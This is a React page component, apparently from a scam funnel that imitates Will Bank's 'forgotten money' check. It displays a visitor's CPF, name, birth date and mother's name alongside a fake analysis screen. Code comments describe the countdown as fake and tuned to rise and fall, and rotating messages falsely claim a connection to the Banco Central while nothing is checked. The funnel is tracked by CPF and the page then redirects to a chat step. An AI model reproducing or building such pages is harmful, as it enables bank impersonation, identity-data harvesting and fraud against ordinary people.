import { useEffect, useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { CreditCard, User, Calendar, Users, Search, Clock } from "lucide-react";
import WillBankHeader from "@/components/WillBankHeader";
import WillBankCard from "@/components/WillBankCard";
import WillBankFooter from "@/components/WillBankFooter";
import { CPFData } from "@/lib/cpf";
import { Progress } from "@/components/ui/progress";
import { saveSession, getSession } from "@/hooks/useSessionPersistence";
import { buildUrlWithUtm } from "@/hooks/useUtmTracking";
import { trackFunnelEvent } from "@/hooks/useFunnelTracking";

const REAL_DURATION = 40;

// Mapeia tempo real (0-40s) → tempo fake em segundos (960 = 16min, 0 = 0min)
const fakeTimeMap = [
  960, 950, 930, 910, 890, // 0-4s: 16:00 → 14:50
  870, 820, 750, 680, 600, // 5-9s: desce rápido
  650, 680, 700, 690, 670, // 10-14s: SOBE um pouco
  620, 550, 480, 420, 380, 350, 320, 300, 280, 260, // 15-24s: desce
  300, 340, 370, 350, 320, // 25-29s: SOBE de novo
  280, 220, 160, 110, 80,  // 30-34s: desce rápido
  60, 45, 30, 15, 5, 0     // 35-40s: finaliza
];

const messages = [
  "Conectando ao Banco Central...",
  "Verificando contas inativas...",
  "Analisando valores esquecidos...",
  "Consultando base do Will Bank...",
  "Verificando histórico de transações...",
  "Processando informações cadastrais...",
  "Validando elegibilidade...",
  "Calculando valores disponíveis...",
  "Finalizando análise..."
];

const Video = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [realElapsed, setRealElapsed] = useState(0);

  // Try to get cpfData from location state or session
  const cpfData: CPFData | undefined = location.state?.cpfData || getSession()?.cpfData;

  useEffect(() => {
    if (!cpfData) {
      navigate("/");
      return;
    }

    // Save session
    saveSession({ cpfData, currentStep: "/video" });
    
    // Track funnel event
    trackFunnelEvent('video', { cpf: cpfData.cpf });
  }, [cpfData, navigate]);

  // Timer real
  useEffect(() => {
    if (!cpfData) return;

    const interval = setInterval(() => {
      setRealElapsed(prev => {
        if (prev >= REAL_DURATION) {
          clearInterval(interval);
          navigate(buildUrlWithUtm("/chat"), { state: { cpfData } });
          return prev;
        }
        return prev + 1;
      });
    }, 1000);

    return () => clearInterval(interval);
  }, [cpfData, navigate]);

  if (!cpfData) return null;

  // Display
  const fakeSeconds = fakeTimeMap[Math.min(realElapsed, 40)];
  const displayMinutes = Math.floor(fakeSeconds / 60);
  const displaySeconds = fakeSeconds % 60;
  const progress = (realElapsed / REAL_DURATION) * 100;

  // Mensagem rotativa (muda a cada ~5s)
  const currentMessage = messages[Math.floor(realElapsed / 5) % messages.length];

  const isComplete = realElapsed >= REAL_DURATION;

  const dataFields = [
    { icon: CreditCard, value: cpfData.cpf },
    { icon: User, value: cpfData.nome },
    { icon: Calendar, value: cpfData.dataNascimento },
    { icon: Users, value: cpfData.nomeMae },
  ];

  return (
    <div className="min-h-screen min-h-[100dvh] bg-background flex flex-col">
      <WillBankHeader userName={cpfData.nome.split(' ')[0].toUpperCase()} />

      <main className="flex-1 flex items-center justify-center p-3 sm:p-6">
        <WillBankCard className="w-full max-w-2xl">
          <div className="space-y-4 sm:space-y-6">
            {/* Progress bar at top */}
            <Progress value={progress} className="h-1.5 sm:h-2" />

            {/* Analysis Screen */}
            <div className="relative aspect-video bg-gradient-to-br from-primary/10 to-primary/5 rounded-xl sm:rounded-2xl overflow-hidden shadow-xl flex flex-col items-center justify-center">
              {/* Ícone animado */}
              <div className="w-16 h-16 sm:w-20 sm:h-20 bg-primary/20 rounded-full flex items-center justify-center mb-4">
                <Search className={`w-8 h-8 sm:w-10 sm:h-10 text-primary ${!isComplete ? 'animate-pulse' : ''}`} />
              </div>
              
              {/* Texto principal */}
              <h2 className="text-lg sm:text-xl font-bold text-foreground mb-2">
                {isComplete ? "Análise concluída!" : "Analisando seus dados..."}
              </h2>
              
              {/* Mensagem rotativa */}
              <p className="text-muted-foreground text-sm mb-4 text-center px-4">
                {isComplete ? "Redirecionando..." : currentMessage}
              </p>
              
              {/* Timer fake */}
              <div className="flex items-center gap-2 bg-black/10 px-4 py-2 rounded-full">
                <Clock className="w-4 h-4 text-muted-foreground" />
                <span className="font-mono font-bold text-foreground">
                  {String(displayMinutes).padStart(2, '0')}:{String(displaySeconds).padStart(2, '0')}
                </span>
              </div>
            </div>

            {/* User Data Card */}
            <div className="border-2 border-primary/40 rounded-xl sm:rounded-2xl overflow-hidden shadow-sm">
              <div className="divide-y divide-border/40">
                {dataFields.map((field, index) => {
                  const Icon = field.icon;
                  return (
                    <div key={index} className="flex items-center gap-3 p-3 sm:p-4 hover:bg-muted/30 transition-colors">
                      <div className="w-9 h-9 sm:w-11 sm:h-11 bg-gradient-to-br from-primary/20 to-primary/10 rounded-lg sm:rounded-xl flex items-center justify-center">
                        <Icon className="w-4 h-4 sm:w-5 sm:h-5 text-primary" />
                      </div>
                      <span className="font-semibold text-foreground text-sm sm:text-base">{field.value}</span>
                    </div>
                  );
                })}
                
                {/* Consulta Status */}
                <div className="flex items-center gap-3 p-3 sm:p-4 bg-primary/5">
                  <div className="w-9 h-9 sm:w-11 sm:h-11 bg-primary/20 rounded-lg sm:rounded-xl flex items-center justify-center">
                    <Search className={`w-4 h-4 sm:w-5 sm:h-5 text-primary ${!isComplete ? 'animate-pulse' : ''}`} />
                  </div>
                  <span className={`font-medium text-sm sm:text-base ${isComplete ? 'text-success' : 'text-muted-foreground'}`}>
                    {isComplete ? "✓ Análise concluída!" : "Análise em andamento..."}
                  </span>
                </div>
              </div>
            </div>
          </div>
        </WillBankCard>
      </main>

      <WillBankFooter />
    </div>
  );
};

export default Video;
